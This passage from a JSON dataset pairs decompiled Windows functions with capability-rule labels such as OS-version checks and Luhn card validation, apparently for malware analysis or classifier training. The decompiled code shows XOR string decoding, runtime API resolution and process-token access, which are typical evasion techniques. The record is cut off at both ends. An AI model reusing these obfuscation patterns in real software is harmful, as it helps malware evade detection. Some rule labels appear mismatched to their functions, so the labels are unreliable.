_sym.imp.KERNEL32.dll_HeapFree;\n            var_1ch = iVar8;\n        }\n        else {\n            var_4ch._0_1_ = 0x2b;\n            var_4ch._1_1_ = 7;\n            var_4ch._2_2_ = 0x4760;\n            var_48h._0_2_ = 0x3306;\n            var_48h._2_2_ = 0x120a;\n            var_44h._0_2_ = 0x6604;\n            var_44h._2_2_ = 0x1b5c;\n            var_40h._0_2_ = 0x1a33;\n            var_40h._2_2_ = 0x1c10;\n            var_3ch._0_2_ = 0x507d;\n            var_3ch._2_2_ = 0x2804;\n            var_38h._0_2_ = 0x81d;\n            var_38h._2_1_ = 0x70;\n            var_30h._0_1_ = 0x71;\n            var_30h._1_2_ = 0x3070;\n            var_30h._3_1_ = 0x35;\n            var_2ch = 0x69;\n            var_2bh = 0x47;\n            var_2ah = 0x6f;\n            fcn.00401000(0x17);\n            iVar8 = 0;\n            do {\n                puVar1 = iVar8 + var_18h;\n                iVar10 = iVar8 % var_10h;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_30h + iVar10) ^ puVar1[&var_4ch - var_18h];\n            } while (iVar8 < 0x17);\n            *0x41bda8 = fcn.00409606();\n            *0x41bdac = *0x41bda8 >> 0x1f;\n            if ((*0x41bda8 | *0x41bdac) != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                (*pcVar7)(uVar3);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                (*pcVar7)(uVar3);\n                uVar3 = (*pcVar2)(0, var_8h);\n                (*pcVar7)(uVar3);\n                goto code_r0x004071bc;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        }\n        (*pcVar7)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n        (*pcVar7)(uVar3);\n        uVar3 = (*pcVar2)(0, var_8h);\n        (*pcVar7)(uVar3);\n    }\n    else {\ncode_r0x004071bc:\n        puVar9 = 0x41bd98;\n        for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *var_28h = *puVar9;\n            puVar9 = puVar9 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2671
    },
    "004071d2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004071d2(uchar *param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41bd80 | *0x41bd84) == 0) || ((*0x41bd88 | *0x41bd8c) == 0)) || ((*0x41bd90 | *0x41bd94) == 0)) {\n        var_4h = 0x7f;\n        var_34h._0_2_ = 0x3d2b;\n        var_34h._2_1_ = 0x1d;\n        var_34h._3_1_ = 0x20;\n        var_ch = 7;\n        var_30h._0_1_ = 7;\n        var_30h._1_2_ = 0x1c6b;\n        var_30h._3_1_ = 0x29;\n        var_2ch = 0x25;\n        var_2bh = 0x79;\n        var_24h = 0x4c794945;\n        var_20h._0_2_ = 0x456b;\n        var_20h._2_1_ = 0x78;\n        var_14h = param_2;\n        fcn.00401000(10);\n        iVar11 = 0;\n        do {\n            puVar1 = iVar11 + var_10h;\n            iVar5 = iVar11 % var_ch;\n            iVar11 = iVar11 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - var_10h];\n        } while (iVar11 < 10);\n        var_34h._0_2_ = 0x273f;\n        var_34h._2_1_ = 7;\n        var_34h._3_1_ = 0x7b;\n        var_30h._0_1_ = 0x17;\n        var_30h._1_2_ = 0x2d26;\n        var_30h._3_1_ = 0x37;\n        var_2ch = 0x2f;\n        var_2bh = 0x19;\n        var_2ah = 0x37;\n        var_24h = 0x37754373;\n        var_20h._0_2_ = 0x4778;\n        var_20h._2_1_ = 0x49;\n        fcn.00401000(0xb);\n        iVar5 = var_10h;\n        iVar11 = var_18h;\n        iVar9 = 0;\n        do {\n            puVar1 = iVar9 + var_18h;\n            iVar6 = iVar9 % var_ch;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_34h - var_18h];\n        } while (iVar9 < 0xb);\n        *0x41bd80 = fcn.0040a354(var_18h);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41bd80 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar8)(0, iVar5);\n            (*pcVar2)(uVar3);\n            goto code_r0x004074c0;\n        }\n        var_4ch._0_1_ = 0x29;\n        var_4ch._1_1_ = 0x12;\n        var_4ch._2_2_ = 0x3e3c;\n        var_48h._0_2_ = 0x4409;\n        var_48h._2_2_ = 0x502;\n        var_44h._0_2_ = 0x150a;\n        var_44h._2_2_ = 0x1d2b;\n        var_40h._0_2_ = 0x4219;\n        var_40h._2_2_ = 0x3637;\n        var_3ch._0_2_ = 0x1201;\n        var_3ch._2_2_ = 0x1c3c;\n        var_38h._0_2_ = 0x431f;\n        var_38h._2_1_ = 0x52;\n        var_34h._0_2_ = 0x7665;\n        var_34h._2_1_ = 0x4e;\n        var_34h._3_1_ = 0x79;\n        var_30h._0_1_ = 0x6c;\n        var_30h._1_2_ = 0x5230;\n        var_30h._3_1_ = 0x77;\n        fcn.00401000(0x17);\n        uVar7 = 0;\n        do {\n            puVar1 = uVar7 + var_8h;\n            uVar4 = uVar7 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar7 = uVar7 + 1;\n            *puVar1 = *(&var_34h + uVar4) ^ puVar1[&var_4ch - var_8h];\n        } while (uVar7 < 0x17);\n        *0x41bd88 = fcn.0040a354(var_8h);\n        if (*0x41bd88 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            var_10h = iVar5;\n        }\n        else {\n            var_4ch._0_1_ = 0x2b;\n            var_4ch._1_1_ = 7;\n            var_4ch._2_2_ = 0x4760;\n            var_48h._0_2_ = 0x3306;\n            var_48h._2_2_ = 0x120a;\n            var_44h._0_2_ = 0x6604;\n            var_44h._2_2_ = 0x1b5c;\n            var_40h._0_2_ = 0x1a33;\n            var_40h._2_2_ = 0x1c10;\n            var_3ch._0_2_ = 0x507d;\n            var_3ch._2_2_ = 0x2804;\n            var_38h._0_2_ = 0x81d;\n            var_38h._2_1_ = 0x70;\n            var_30h._0_1_ = 0x71;\n            var_30h._1_2_ = 0x3070;\n            var_30h._3_1_ = 0x35;\n            var_2ch = 0x69;\n            var_2bh = 0x47;\n            var_2ah = 0x6f;\n            fcn.00401000(0x17);\n            iVar11 = 0;\n            do {\n                puVar1 = iVar11 + var_1ch;\n                iVar5 = iVar11 % var_ch;\n                iVar11 = iVar11 + 1;\n                *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_4ch - var_1ch];\n            } while (iVar11 < 0x17);\n            *0x41bd90 = fcn.0040a354(var_1ch);\n            if (*0x41bd90 != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                (*pcVar8)(uVar3);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                (*pcVar8)(uVar3);\n                uVar3 = (*pcVar2)(0, var_10h);\n                (*pcVar8)(uVar3);\n                goto code_r0x004074b3;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        }\n        (*pcVar8)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n        (*pcVar8)(uVar3);\n        uVar3 = (*pcVar2)(0, var_10h);\n        (*pcVar8)(uVar3);\n    }\n    else {\ncode_r0x004074b3:\n        puVar10 = 0x41bd80;\n        for (iVar11 = 0x18; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *var_28h = *puVar10;\n            puVar10 = puVar10 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x004074c0:\n    *0x41bd94 = *0x41bd90 >> 0x20;\n    *0x41bd8c = *0x41bd88 >> 0x20;\n    *0x41bd84 = *0x41bd80 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2599
    },
    "004089ee": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.004089ee(int32_t *param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0xc0000023;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (piVar2 = param_1[1],  piVar2 != NULL)) {\n        if (*param_1 == *piVar2) {\n            var_38h = 0x21c2e63;\n            var_34h = 0x370e1424;\n            var_30h = 0x35152841;\n            var_2ch = 0x3c143532;\n            var_28h._0_1_ = 0x57;\n            var_28h._1_1_ = 0x3f;\n            var_28h._2_2_ = 0x4602;\n            var_24h = 0x46705a31;\n            var_20h = 0x5a617741;\n            var_1ch = param_2;\n            var_18h = param_1;\n            var_8h = piVar2;\n            fcn.00401000(0x14);\n            uVar6 = 0;\n            do {\n                puVar1 = uVar6 + var_4h;\n                uVar4 = uVar6 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar6 = uVar6 + 1;\n                *puVar1 = *(&var_24h + uVar4) ^ puVar1[&var_38h - var_4h];\n            } while (uVar6 < 0x14);\n            var_30h = 0x201d3d2b;\n            var_14h = 0x7;\n            var_2ch = 0x291c6b07;\n            var_28h._0_1_ = 0x25;\n            var_28h._1_1_ = 0x79;\n            var_24h = 0x4c794945;\n            var_20h = var_20h & 0xff000000 | 0x78456b;\n            fcn.00401000(10);\n            iVar3 = var_4h;\n            iVar8 = 0;\n            do {\n                puVar1 = iVar8 + var_10h;\n                iVar7 = iVar8 % var_14h;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_30h - var_10h];\n            } while (iVar8 < 10);\n            uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(var_10h, var_4h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n            piVar2 = var_8h;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h[1]);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar8 = *piVar2;\n            var_18h = var_18h[1] + 0xc;\n            fcn.00408953();\n            piVar2 = var_8h;\n            var_8h = (*var_14h)(2, var_4h, var_8h[1], var_18h, iVar8 + -0xc, &var_ch);\n            if (var_8h == NULL) {\n                if (var_ch == piVar2[1]) {\n                    var_1ch[1] = var_4h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    var_8h = 0xc000007b;\n                }\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        else {\n            var_8h = 0xc000007b;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1238
    },
    "00409705": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409705(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_17h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    int32_t var_4h;\n    \n    var_20h = 0x201d3d2b;\n    var_4h = 7;\n    var_1ch._0_1_ = 7;\n    var_1ch._1_1_ = 0x6b;\n    var_1ch._2_1_ = 0x1c;\n    stack0xffffffe3 = 0x2529;\n    var_17h = 0x79;\n    var_10h = 0x4c794945;\n    var_ch._0_2_ = 0x456b;\n    var_ch._2_1_ = 0x78;\n    fcn.00401000(10);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + lpModuleName;\n        iVar6 = iVar8 % var_4h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_10h + iVar6) ^ puVar1[&var_20h - lpModuleName];\n    } while (iVar8 < 10);\n    var_30h = 0x1e371c6a;\n    var_2ch = 0x42620617;\n    var_28h = 0x10b1b04;\n    var_24h._0_2_ = 0x321b;\n    var_20h = 0x6e786b30;\n    var_1ch._0_1_ = 0x72;\n    var_1ch._1_1_ = 0x68;\n    var_1ch._2_1_ = 0x32;\n    fcn.00401000(0xe);\n    iVar8 = var_10h;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + var_10h;\n        iVar7 = iVar6 % var_4h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_30h - var_10h];\n    } while (iVar6 < 0xe);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3, iVar8);\n    uVar3 = (*pcVar4)(var_14h, 0x1f0fff, arg_8h, arg_ch);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, lpModuleName);\n    (*pcVar4)(uVar5);\n    return uVar3;\n}\n",
        "token_count": 817
    },
    "00409e96": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409e96(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uint var_27h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    if ((*0x41bdb8 | *0x41bdbc) == 0) {\n        var_30h = 0x201d3d2b;\n        var_4h = 7;\n        var_2ch._0_1_ = 7;\n        var_2ch._1_1_ = 0x6b;\n        var_2ch._2_1_ = 0x1c;\n        var_2ch._3_1_ = 0x29;\n        var_28h = 0x25;\n        var_27h._0_1_ = 0x79;\n        stack0xffffffd8 = 0x4c794945;\n        var_20h._0_2_ = 0x456b;\n        var_20h._2_1_ = 0x78;\n        fcn.00401000(10);\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_8h;\n            iVar4 = iVar8 % var_4h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_27h + iVar4 + 3) ^ puVar1[&var_30h - var_8h];\n        } while (iVar8 < 10);\n        var_38h = 0xf1d2d2e;\n        var_34h = 0x1a1e1904;\n        var_30h = 0x4123f2e;\n        var_2ch._0_1_ = 0xe;\n        var_2ch._1_1_ = 0x19;\n        var_2ch._2_1_ = 6;\n        var_2ch._3_1_ = 0x3f;\n        var_28h = 0x3b;\n        var_27h._0_1_ = 0xe;\n        var_27h._1_1_ = 0x70;\n        stack0xffffffd8 = 0x6a5a5a74;\n        var_20h._0_2_ = 0x5a70;\n        var_20h._2_1_ = 0x71;\n        fcn.00401000(0x13);\n        iVar4 = var_8h;\n        iVar8 = var_10h;\n        iVar6 = 0;\n        do {\n            puVar1 = iVar6 + var_10h;\n            iVar5 = iVar6 % var_4h;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_27h + iVar5 + 3) ^ puVar1[&var_38h - var_10h];\n        } while (iVar6 < 0x13);\n        *0x41bdb8 = fcn.0040a354(var_10h);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41bdb8 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar7)(0, iVar4);\n            (*pcVar2)(uVar3);\n            goto code_r0x0040a204;\n        }\n        var_38h = 0x1c1d3c0e;\n        var_34h = 0x3a587215;\n        var_30h = 0x15012b3f;\n        var_2ch._0_1_ = 0x65;\n        var_2ch._1_1_ = 0x5f;\n        var_2ch._2_1_ = 0x26;\n        var_2ch._3_1_ = 0x2e;\n        var_28h = 0x2f;\n        var_27h._0_1_ = 0x1d;\n        var_27h._1_1_ = 0x61;\n        stack0xffffffd8 = 0x794e4b54;\n        var_20h._0_2_ = 0x3161;\n        var_20h._2_1_ = 0x37;\n        fcn.00401000(0x13);\n        iVar8 = var_8h;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_ch;\n            iVar6 = iVar4 % var_4h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_27h + iVar6 + 3) ^ puVar1[&var_38h - var_ch];\n        } while (iVar4 < 0x13);\n        *0x41bdc0 = fcn.0040a354(var_ch);\n        if (*0x41bdc0 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            var_8h = iVar8;\n        }\n        else {\n            var_38h = 0x23081b29;\n            var_34h = 0x1658141d;\n            var_30h = 0x3e240a1b;\n            var_2ch._0_1_ = 0x27;\n            var_2ch._1_1_ = 0x52;\n            var_2ch._2_1_ = 7;\n            var_2ch._3_1_ = 5;\n            var_28h = 0x2a;\n            var_27h._0_1_ = 0x2c;\n            var_27h._1_1_ = 0x6d;\n            stack0xffffffd8 = 0x42456c73;\n            var_20h._0_2_ = 0x426d;\n            var_20h._2_1_ = 0x31;\n            fcn.00401000(0x13);\n            iVar8 = var_8h;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_18h;\n                iVar6 = iVar4 % var_4h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_27h + iVar6 + 3) ^ puVar1[&var_38h - var_18h];\n            } while (iVar4 < 0x13);\n            *0x41bdc8 = fcn.0040a354(var_18h);\n            if (*0x41bdc8 == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                var_8h = iVar8;\n            }\n            else {\n                var_50h = 0x80d0f36;\n                var_4ch = 0x3a3b2639;\n                var_48h = 0x1b113d11;\n                var_44h = 0x1b091821;\n                var_40h = 0x293b0f2c;\n                var_3ch._0_1_ = 0x4b;\n                var_2ch._0_1_ = 0x6c;\n                var_2ch._1_1_ = 0x78;\n                var_2ch._2_1_ = 0x58;\n                var_2ch._3_1_ = 0x66;\n                var_28h = 0x54;\n                var_27h._0_1_ = 0x47;\n                var_27h._1_1_ = 0x4b;\n                fcn.00401000(0x15);\n                iVar8 = 0;\n                do {\n                    puVar1 = iVar8 + var_1ch;\n                    iVar4 = iVar8 % var_4h;\n                    iVar8 = iVar8 + 1;\n                    *puVar1 = *(&var_2ch + iVar4) ^ puVar1[&var_50h - var_1ch];\n                } while (iVar8 < 0x15);\n                *0x41bdd0 = fcn.0040a354(var_1ch);\n                if (*0x41bdd0 != 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                    (*pcVar7)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                    (*pcVar7)(uVar3);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                    (*pcVar7)(uVar3);\n                    uVar3 = (*pcVar2)(0, var_8h);\n                    (*pcVar7)(uVar3);\n                    goto code_r0x0040a1ff;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n            }\n            (*pcVar7)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        }\n        (*pcVar7)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n        (*pcVar7)(uVar3);\n        uVar3 = (*pcVar2)(0, var_8h);\n        (*pcVar7)(uVar3);\n    }\n    else {\ncode_r0x0040a1ff:\n        var_14h = 0x41bdb8;\n    }\ncode_r0x0040a204:\n    *0x41bdd4 = *0x41bdd0 >> 0x20;\n    *0x41bdcc = *0x41bdc8 >> 0x20;\n    *0x41bdc4 = *0x41bdc0 >> 0x20;\n    *0x41bdbc = *0x41bdb8 >> 0x20;\n    return var_14h;\n}\n",
        "token_count": 2670
    },
    "00408582": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408582(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_30h;\n    var_10h = param_2;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_18h = *0x41bd34;\n    uVar5 = 0;\n    var_14h = 0;\n    var_4h = 0;\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0;\n    var_28h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    iVar4 = (*_sym.imp.ntdll.dll_ZwOpenProcess)(&var_ch, 0x400, &var_30h, &var_18h);\n    if (-1 < iVar4) {\n        iVar4 = (*_sym.imp.ntdll.dll_ZwOpenProcessToken)(var_ch, 8, &var_8h);\n        pcVar1 = _sym.imp.ntdll.dll_ZwQueryInformationToken;\n        if (-1 < iVar4) {\n            (*_sym.imp.ntdll.dll_ZwQueryInformationToken)(var_8h, 1, 0, 0, &var_4h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar4 = (*pcVar1)(var_8h, 1, puVar3, var_4h, &var_4h);\n                if (-1 < iVar4) {\n                    puVar6 = *puVar3;\n                    puVar7 = var_10h;\n                    for (iVar4 = 0x1c; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                    uVar5 = 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.ntdll.dll_ZwClose)(var_8h);\n        }\n        (*_sym.imp.ntdll.dll_ZwClose)(var_ch);\n    }\n    return uVar5;\n}\n",
        "token_count": 730
    },
    "0040a354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040a354(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040a20b(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.0040985c(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00408bd8(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 579
    },
    "0040b260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
